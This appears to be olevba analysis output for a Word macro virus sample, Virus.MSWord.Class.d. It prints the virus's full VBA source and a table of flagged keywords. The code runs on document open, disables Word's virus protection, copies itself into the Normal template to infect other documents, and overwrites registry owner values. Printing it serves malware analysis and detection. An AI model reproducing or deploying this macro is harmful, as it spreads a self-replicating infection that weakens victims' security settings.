olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-dad7fa3012b34e0358b8cba114d8db1c8f5c8690
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-dad7fa3012b34e0358b8cba114d8db1c8f5c8690 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
Const REG_SZ As Long = 1
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
Const HKEY_CURRENT_USER As Long = &H80000001
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
Sub AutoOpen()
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
On Error GoTo out
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
Options.VirusProtection = False
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
Options.SaveNormalPrompt = False
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
Options.ConfirmConversions = False
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
If nt > 70 And ad > 0 Then GoTo out
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
If nt < 70 Then
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
End If
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
host.codemodule.AddFromFile ("c:\class.sys")
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
With host.codemodule
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
    For x = 1 To 16
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
    .deletelines 1
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
    Next x
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
End With
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
If nt < 70 Then
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
    With host.codemodule
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
    .replaceline 1, "Sub AutoClose()"
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
    .replaceline 91, "Sub ToolsMacro()"
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
    For x = 70 To 81
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
        .deletelines 62
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
    Next x
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
    .replaceline 35, "    For x = 1 To 4"
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
    End With
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
End If
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
If nt < 70 Then
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
u = RegCloseKey(k)
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
End If
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
With host.codemodule
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
    For x = 2 To 104 Step 2
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
    Next x
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
End With
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
out:
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
End Sub
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
Sub ViewVBCode()
'JAMAL10/5/98 5:53:51 PMHP LaserJet 4000 Series PCL 6 on \\ACN_SERVER\ACN100LDCTPRAM-C2(U)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
